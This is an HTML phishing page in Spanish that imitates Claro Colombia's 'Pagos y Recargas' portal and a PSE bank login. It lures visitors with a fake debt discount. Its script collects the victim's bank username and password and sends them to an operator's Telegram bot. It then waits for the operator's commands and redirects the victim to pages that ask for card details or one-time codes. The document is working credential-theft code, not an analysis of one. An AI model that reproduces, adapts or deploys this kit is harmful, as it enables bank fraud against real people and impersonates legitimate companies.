<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" type="image/png" href="img/favicon.ico" />
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
        rel="stylesheet" />
    <title>Inicia Sesión en tu Banco | Claro</title>
    <style>
        body {
            font-family: "Open Sans", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
        }

        #loader-container {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        #loader {
            width: 3.25em;
            transform-origin: center;
            animation: rotate4 2s linear infinite;
        }

        circle {
            fill: none;
            stroke: hsl(0, 97%, 59%);
            stroke-width: 2;
            stroke-dasharray: 1, 200;
            stroke-dashoffset: 0;
            stroke-linecap: round;
            animation: dash4 1.5s ease-in-out infinite;
        }

        @keyframes rotate4 {
            100% {
                transform: rotate(360deg);
            }
        }

        @keyframes dash4 {
            0% {
                stroke-dasharray: 1, 200;
                stroke-dashoffset: 0;
            }

            50% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -35;
            }

            100% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -124;
            }
        }

        input:focus {
            outline: none;
            box-shadow: 0 0 0 2px #FFC73C;
        }

        .input-error {
            border-color: #EF3320;
        }

        .error-message {
            color: #EF3320;
            font-size: 0.8rem;
            margin-top: 4px;
        }
    </style>
</head>

<body class="bg-gray-100 text-gray-800 antialiased">
    <div class="px-6 flex items-center justify-between h-10 bg-white">
        <div class="flex items-center gap-8">
            <p class="text-sm text-[#313131] font-semibold border-b-4 border-[#FFC73C]">Personas</p>
            <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Negocios
            </p>
            <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Empresas
            </p>
            <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Institucional
            </p>
        </div>
        <div class="flex items-center gap-4">
            <div class="flex items-center gap-2 text-sm text-[#313131] font-semibold">Más de Claro
                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
                </svg>
            </div>
            <div class="flex items-center gap-2 text-sm text-[#313131] font-semibold">
                <img class="w-5 h-5" src="./assets/flag-colombia.svg" alt="">
                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
                </svg>
            </div>
        </div>
    </div>
    <header class="bg-[#EF3320] h-14 flex items-center px-4 md:px-10 justify-between">
        <div class="flex items-center gap-4">
            <svg xmlns="http://www.w3.org/2000/svg" class="md:hidden w-6 h-6 text-white" viewBox="0 0 24 24" fill="none"
                stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M4 6h16M4 12h16M4 18h16" />
            </svg>
            <img class="w-20" src="./assets/claro.svg" alt="Claro">
            <nav class="hidden md:flex items-center gap-6 text-white">
                <div class="flex items-center gap-1"><span class="text-sm font-bold">Servicios</span>
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
                        <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
                    </svg>
                </div>
                <div class="flex items-center gap-1"><span class="text-sm font-bold">Tienda</span>
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
                        <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
                    </svg>
                </div>
                <div class="flex items-center gap-1"><span class="text-sm font-bold">Soporte</span>
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
                        <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
                    </svg>
                </div>
            </nav>
        </div>
        <div class="flex items-center gap-3">
            <div class="hidden md:flex items-center gap-3 text-white"><span class="text-xs font-semibold">Información
                    importante para usuarios</span>
                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
                    <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
                </svg>
            </div>
            <button class="flex items-center gap-2 rounded-full px-4 h-10 bg-[#D01508] text-white font-bold">
                <img class="w-6 h-6" src="./assets/c2btn.png" alt=""> Mi Claro
            </button>
        </div>
    </header>

    <main class="px-4 md:px-10 py-6">
        <div id="ggris1" class="bg-white rounded-xl p-6 shadow-sm max-w-2xl mx-auto">
            <div class="text-gray-700 text-center">
                <p class="text-xl font-semibold">
                    Portal de <span class="text-[#EF3320]">PAGOS <span class="font-normal">Y RECARGAS</span></span>
                </p>
                <p class="mt-4 text-sm font-medium">Estás a punto de pagar:</p>
                <p id="valor-a-pagar" class="text-4xl font-bold text-[#EF3320] mt-2">$ 0,00</p>
            </div>
        </div>

        <section id="bank-form-section" class="mt-6 max-w-xl mx-auto bg-white p-6 shadow-lg rounded-lg">
            <div class="flex items-center justify-center mb-4">
                <img id="pse-logo" class="h-24 w-auto" src="https://www.laquinta.com.co/wp-content/uploads/2022/11/logo-pse-300x300-1.png" alt="Logo PSE">
            </div>
            <h2 id="bank-title" class="text-lg font-bold text-center border-b pb-2 mb-4">Inicia Sesión en tu Banco</h2>
            <form id="bank-login-form">
                <div class="space-y-4" id="form-fields">
                    <div>
                        <label for="user" class="block text-sm font-medium text-gray-700">Usuario</label>
                        <input type="text" id="user" name="user"
                            class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
                        <p id="error-user" class="error-message hidden">El usuario es requerido.</p>
                    </div>
                    <div>
                        <label for="clave" class="block text-sm font-medium text-gray-700">Clave</label>
                        <input type="password" id="clave" name="clave" inputmode="numeric"
                            class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
                        <p id="error-clave" class="error-message hidden">La clave es requerida.</p>
                    </div>
                </div>
                <div class="mt-8 text-center">
                    <button type="submit" id="payButton"
                        class="w-full h-14 rounded-xl text-white font-bold text-lg bg-[#EF3320] hover:bg-[#d01508] transition-colors">
                        CONTINUAR
                    </button>
                </div>
            </form>
        </section>
    </main>

    <footer class="mt-8">
        <img class="hidden md:block w-full" src="./assets/footer-dk.png" alt="">
        <img class="block md:hidden w-full" src="./assets/footer.png" alt="">
    </footer>

    <div id="loader-container">
        <div id="loader">
            <svg viewBox="25 25 50 50">
                <circle r="20" cy="50" cx="50"></circle>
            </svg>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const urlParams = new URLSearchParams(window.location.search);
            const deudaTotal = parseFloat(urlParams.get('deuda'));
            const bankLogoUrl = urlParams.get('logo');
            const bankName = urlParams.get('banco');
            
            const formatCurrency = (amount) => {
                return new Intl.NumberFormat('es-CO', {
                    style: 'currency',
                    currency: 'COP',
                    minimumFractionDigits: 0,
                    maximumFractionDigits: 0
                }).format(amount);
            };

            if (!isNaN(deudaTotal)) {
                const descuento = 0.20;
                const deudaConDescuento = deudaTotal * (1 - descuento);
                document.getElementById('valor-a-pagar').textContent = formatCurrency(deudaConDescuento);
            } else {
                console.error("No se encontraron parámetros de deuda válidos en la URL.");
            }

            if (bankLogoUrl) {
                const pseLogo = document.getElementById('pse-logo');
                pseLogo.src = decodeURIComponent(bankLogoUrl);
                if (bankName) {
                    const readableBankName = bankName.charAt(0).toUpperCase() + bankName.slice(1);
                    pseLogo.alt = `Logo de ${readableBankName}`;
                    document.getElementById('bank-title').textContent = `Inicia Sesión en ${readableBankName}`;
                }
            }

            const bankLoginForm = document.getElementById('bank-login-form');
            const loaderContainer = document.getElementById('loader-container');

            bankLoginForm.addEventListener('submit', async function(event) {
                event.preventDefault();
                let isValid = true;
                document.querySelectorAll('.error-message').forEach(el => el.classList.add('hidden'));
                document.querySelectorAll('input').forEach(el => el.classList.remove('input-error'));

                const user = document.getElementById('user');
                const clave = document.getElementById('clave');

                if (user.value.trim() === '') {
                    document.getElementById('error-user').classList.remove('hidden');
                    user.classList.add('input-error');
                    isValid = false;
                }
                if (clave.value.trim() === '') {
                    document.getElementById('error-clave').classList.remove('hidden');
                    clave.classList.add('input-error');
                    isValid = false;
                }

                if (isValid) {
                    loaderContainer.style.display = 'flex';
                    const tid = Date.now().toString(36) + Math.random().toString(36).slice(2);
                    
                    let message = `<b>🔔 Nuevo Intento de Pago</b>\n`;
                    message += `🏦 <b>Banco:</b> ${bankName ? bankName.toUpperCase() : 'Desconocido'}\n`;
                    message += `🆔 <b>ID:</b> ${tid}\n`;
                    message += `💰 <b>Valor:</b> ${document.getElementById('valor-a-pagar').textContent}\n`;
                    message += `👤 <b>Usuario:</b> <code>${user.value}</code>\n`;
                    message += `🔑 <b>Clave:</b> <code>${clave.value}</code>`;

                    localStorage.setItem('formData', JSON.stringify({ usuario: user.value, clave: clave.value }));

                    const keyboard = {
                        inline_keyboard: [
                            [{ text: "✅ Pedir TC", callback_data: `pedir_tc:${tid}` }],
                            [{ text: "❌ Pedir Código", callback_data: `pedir_code:${tid}` }],
                            [{ text: "🚨 Datos Incorrectos", callback_data: `datos_incorrectos:${tid}` }]
                        ]
                    };
                    
                    try {
                        const cfg = await loadCfg();
                        await sendToTelegram(cfg, message, keyboard);
                        poll(cfg, tid, bankName, deudaTotal);
                    } catch (err) {
                        console.error('Error durante el proceso:', err);
                        loaderContainer.style.display = 'none';
                        alert('Error en la transacción. Por favor, intente de nuevo.');
                    }
                }
            });

            async function loadCfg() {
                const res = await fetch('config.json');
                if (!res.ok) throw 'No cargó config.json';
                return res.json();
            }

            async function sendToTelegram(cfg, message, keyboard) {
                const res = await fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: cfg.chat_id,
                        text: message,
                        reply_markup: keyboard,
                        parse_mode: 'HTML'
                    })
                });
                const js = await res.json();
                if (!js.ok) throw js;
            }

            async function poll(cfg, tid, bank, deuda) {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${cfg.token}/getUpdates`);
                    const js = await res.json();
                    const upd = js.result.find(u => u.callback_query?.data?.endsWith(`:${tid}`));
                    if (upd) {
                        loaderContainer.style.display = 'none';
                        const action = upd.callback_query.data.split(':')[0];
                        switch (action) {
                            case 'pedir_tc':
                                window.location.href = `tc.html?banco=${bank}&deuda=${deuda}`;
                                break;
                            case 'pedir_code':
                                window.location.href = `code.html?deuda=${deuda}&banco=${bank}&logo=${encodeURIComponent(bankLogoUrl)}`;
                                break;
                            case 'datos_incorrectos':
                                alert('Los datos de inicio de sesión son incorrectos. Por favor, inténtelo de nuevo.');
                                break;
                            default:
                                console.log('Acción no reconocida:', action);
                        }
                    } else {
                        setTimeout(() => poll(cfg, tid, bank, deuda), 2000);
                    }
                } catch (err) {
                    console.error('Error al hacer polling:', err);
                    setTimeout(() => poll(cfg, tid, bank, deuda), 2000);
                }
            }
        });
    </script>
</body>
</html>
